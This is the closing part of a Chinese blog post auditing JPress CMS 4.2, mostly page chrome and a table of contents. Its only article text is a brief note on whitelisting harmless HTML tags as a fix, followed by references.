+<p>作者这里的修复方法是加白，也就是说虽然这确实允许编辑代码，但是像 <code>alert()</code>、<code>svg</code> 这一种标签就不允许过，仅能过一些 <code>h1</code>、<code>h2</code> 这种非恶意标签。</p>
+<h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2>
+<p>Drunkbaby师傅还是太强了</p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-5">jpress V4.2 代码审计 | Drunkbaby’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/JPressProjects/jpress/issues">Issues · JPressProjects/jpress</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="国城杯2024web复现" class="lazyload">
+          
+        
+        <a href="/2025/08/25/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            国城杯2024web复现
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/bg1.jpg" data-sizes="auto" alt="[代码审计]华夏ERPv2.3" class="lazyload">
+        
+      
+      <a href="/2025/08/22/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%E5%8D%8E%E5%A4%8FERP-CMSv2-3/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [代码审计]华夏ERPv2.3
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#jpress%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text"> Jpress介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text"> 环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E5%87%86%E5%A4%87"><span class="toc-number">3.</span> <span class="toc-text"> 审计准备</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%B6%E6%9E%84%E7%90%86%E8%A7%A3"><span class="toc-number">3.1.</span> <span class="toc-text"> 架构理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96"><span class="toc-number">3.2.</span> <span class="toc-text"> 依赖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter"><span class="toc-number">3.3.</span> <span class="toc-text"> Filter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5rce"><span class="toc-number">4.</span> <span class="toc-text"> 模板注入RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3"><span class="toc-number">4.1.</span> <span class="toc-text"> 影响接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%99%BD%E7%9B%92"><span class="toc-number">4.2.</span> <span class="toc-text"> 漏洞分析(白盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E9%BB%91%E7%9B%92"><span class="toc-number">4.3.</span> <span class="toc-text"> 漏洞验证(黑盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.4.</span> <span class="toc-text"> 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text"> 前台任意文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-2"><span class="toc-number">5.1.</span> <span class="toc-text"> 影响接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%99%BD%E7%9B%92-2"><span class="toc-number">5.2.</span> <span class="toc-text"> 漏洞分析(白盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E9%BB%91%E7%9B%92-2"><span class="toc-number">5.3.</span> <span class="toc-text"> 漏洞验证(黑盒)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-%E5%A4%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">5.3.1.</span> <span class="toc-text"> 法一 多文件上传绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-window%E4%B8%8B%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">5.3.2.</span> <span class="toc-text"> 法二 Window下的绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F-filter"><span class="toc-number">5.3.3.</span> <span class="toc-text"> 注意 Filter</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-number">5.4.</span> <span class="toc-text"> 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E2"><span class="toc-number">6.</span> <span class="toc-text"> 前台任意文件上传漏洞2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%E5%AF%BC%E8%87%B4rce"><span class="toc-number">7.</span> <span class="toc-text"> 插件安装导致RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-3"><span class="toc-number">7.1.</span> <span class="toc-text"> 影响接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%99%BD%E7%9B%92-3"><span class="toc-number">7.2.</span> <span class="toc-text"> 漏洞分析(白盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E9%BB%91%E7%9B%92-3"><span class="toc-number">7.3.</span> <span class="toc-text"> 漏洞验证(黑盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="toc-number">7.4.</span> <span class="toc-text"> 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%AE%89%E8%A3%85%E5%AF%BC%E8%87%B4rce"><span class="toc-number">8.</span> <span class="toc-text"> 模板安装导致RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-4"><span class="toc-number">8.1.</span> <span class="toc-text"> 影响接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%99%BD%E7%9B%92-4"><span class="toc-number">8.2.</span> <span class="toc-text"> 漏洞分析(白盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E9%BB%91%E7%9B%92-4"><span class="toc-number">8.3.</span> <span class="toc-text"> 漏洞验证(黑盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-4"><span class="toc-number">8.4.</span> <span class="toc-text"> 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8Ewordpress%E4%B8%AD%E5%AF%BC%E5%85%A5%E6%96%87%E7%AB%A0%E5%8A%9F%E8%83%BD%E5%AD%98%E5%9C%A8xxe%E6%BC%8F%E6%B4%9E-v412"><span class="toc-number">9.</span> <span class="toc-text"> 从WordPress中导入文章功能存在XXE漏洞-V4.1.2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-5"><span class="toc-number">9.1.</span> <span class="toc-text"> 影响接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%99%BD%E7%9B%92-5"><span class="toc-number">9.2.</span> <span class="toc-text"> 漏洞分析(白盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-5"><span class="toc-number">9.3.</span> <span class="toc-text"> 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E6%A8%A1%E6%9D%BF%E4%BF%AE%E6%94%B9"><span class="toc-number">10.</span> <span class="toc-text"> 后台存在命令执行漏洞-模板修改</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3-6"><span class="toc-number">10.1.</span> <span class="toc-text"> 影响接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E9%BB%91%E7%9B%92-5"><span class="toc-number">10.2.</span> <span class="toc-text"> 漏洞验证(黑盒)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-6"><span class="toc-number">10.3.</span> <span class="toc-text"> 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">11.</span> <span class="toc-text"> 参考</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[代码审计]Jpress4.2",
+          url: "http://example.com/2025/08/23/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]Jpress-V4.2/",
+          excerpt: "",
+          description: "",
+          stripContent: " Jpress介绍 JPress CMS，一个完整的 Java CMS 网站管理系统，目前已经有 10w+ 网站使用 JPress CMS 进行驱动，其中包括多个政府机构，200+上市公司，中科院、红+字会等 类似于WordPress，只不过是用java搭建的  环境配置 下载源码 打包 创建新数据库（不导入） 启动 进入install界面   一步步配置就好了  在 undertow.txt 中可以修改端口  别说，还挺好看  审计准备  架构理解 jpress 项目分为前台页面和后台管理界面",
+          date: "Sat Aug 23 2025 19:15:22 GMT+0800",
+          updated: "Mon Sep 21 2026 21:53:40 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
